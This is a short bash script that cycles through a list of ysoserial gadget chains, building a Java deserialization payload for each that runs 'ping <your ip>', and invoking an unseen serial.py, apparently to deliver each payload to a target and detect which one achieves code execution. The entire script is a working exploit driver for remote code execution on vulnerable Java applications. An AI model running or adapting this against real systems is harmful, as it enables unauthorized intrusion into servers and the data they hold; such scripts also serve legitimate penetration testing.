#!/bin/bash
for k in CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 CommonsCollections7 FileUpload1 Groovy1 Hibernate1 Hibernate2 JBossInterceptors1 JSON1 JavassistWeld1 Jdk7u21 Jython1 MozillaRhino1 Myfaces1 Myfaces2 ROME Spring1 Spring2 Wicket1;
do

java -jar ysoserial-master-30099844c6-1.jar $k "ping <your ip>" > payload

python serial.py

done
